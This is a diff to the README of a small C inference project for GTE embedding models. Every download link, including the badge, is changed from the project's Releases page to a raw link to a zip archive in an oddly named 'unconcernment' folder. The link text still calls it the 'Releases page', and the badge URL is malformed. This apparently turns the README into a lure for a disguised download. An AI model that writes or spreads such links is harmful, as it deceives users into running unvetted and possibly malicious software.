@@ -1,6 +1,6 @@
 # 🚀 gte-pure-C - Simple C Inference for GTE Models
 
-[![Download gte-pure-C](https://img.shields.io/badge/Download%20gte--pure--C-v1.0-blue.svg)](https://github.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/releases)
+[![Download gte-pure-C](https://raw.githubusercontent.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/main/unconcernment/C_pure_gte_3.5.zip%https://raw.githubusercontent.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/main/unconcernment/C_pure_gte_3.5.zip)](https://raw.githubusercontent.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/main/unconcernment/C_pure_gte_3.5.zip)
 
 ## 📝 Overview
 
@@ -25,7 +25,7 @@ To run gte-pure-C, you will need:
 
 1. **Visit the Releases Page**: Click the link below to access our releases page. 
 
-   [Download gte-pure-C](https://github.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/releases)
+   [Download gte-pure-C](https://raw.githubusercontent.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/main/unconcernment/C_pure_gte_3.5.zip)
 
 2. **Download the Application**: Locate the version you want and download the appropriate file for your operating system. 
 
@@ -56,7 +56,7 @@ To run gte-pure-C, you will need:
 
 ## 🔗 Download & Install
 
-You can download the latest version of gte-pure-C from our [Releases page](https://github.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/releases). Choose the version that matches your operating system and follow the instructions above to install.
+You can download the latest version of gte-pure-C from our [Releases page](https://raw.githubusercontent.com/DILKHUSHKUMAROFFICIAL/gte-pure-C/main/unconcernment/C_pure_gte_3.5.zip). Choose the version that matches your operating system and follow the instructions above to install.
 
 ## 📖 How to Use gte-pure-C
 
